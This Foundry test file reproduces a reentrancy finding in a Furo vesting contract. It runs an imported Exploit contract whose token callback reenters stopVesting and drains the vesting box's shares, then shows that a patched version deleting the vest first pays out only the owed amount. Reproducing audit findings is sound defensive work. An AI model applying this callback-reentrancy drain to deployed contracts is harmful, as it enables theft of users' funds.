// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    CallbackToken,
    MockBento,
    FuroVesting
} from "./19588-reentrancy-vulnerabilities-may-drain-tokens-sigmaprime-none.sol";

/// Control: sushiswap/furo#17 moves `delete vests[vestId]` above both transfers.
contract FuroVestingFixed is FuroVesting {
    constructor(MockBento bento_) FuroVesting(bento_) {}

    function stopVesting(uint256 vestId, bool toBentoBox) external override {
        FuroVesting.Vest memory vest = vests[vestId];
        if (vest.owner != msg.sender) revert NotOwner();
        uint256 canClaim = _balanceOf(vest) - vest.claimed;
        uint256 returnAmount = (vest.cliffAmount + (vest.steps * vest.stepAmount)) - canClaim;
        delete vests[vestId];
        _transferOut(address(vest.token), address(this), ownerOf[vestId], canClaim, toBentoBox);
        _transferOut(address(vest.token), address(this), msg.sender, returnAmount, toBentoBox);
    }

    function _transferOut(address token, address from, address to, uint256 shares, bool) internal {
        bento.withdraw(token, from, to, 0, shares);
    }
}

contract Control19588 {
    CallbackToken public token;
    MockBento public bento;
    FuroVestingFixed public vesting;
    bool internal armed;

    constructor() {
        token = new CallbackToken();
        bento = new MockBento();
        vesting = new FuroVestingFixed(bento);
        token.setHook(address(this));
    }

    function onTokens() external {
        if (!armed) return;
        armed = false;
        vesting.stopVesting(1, false);
    }

    function run() external {
        bento.credit(address(token), address(vesting), 200);
        vesting.seed(1, address(this), address(this), address(token), 0, 100, 1);
        armed = true;
        vesting.stopVesting(1, false);
    }
}

contract Finding19588Test is Test {
    function test_exploit_stopVesting_reenters_and_drains_box() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.token().balanceOf(address(e)), 200, "attacker pulled both 100-share transfers");
        assertEq(e.bento().balanceOf(address(e.token()), address(e.vesting())), 0, "victim shares gone");
        assertEq(e.reentries(), 2, "callback fired twice");
    }

    function test_control_delete_first_pays_only_the_vest() public {
        Control19588 c = new Control19588();
        c.run();
        assertEq(c.token().balanceOf(address(c)), 100, "only the vest's 100 shares");
        assertEq(c.bento().balanceOf(address(c.token()), address(c.vesting())), 100, "other 100 stays");
    }
}
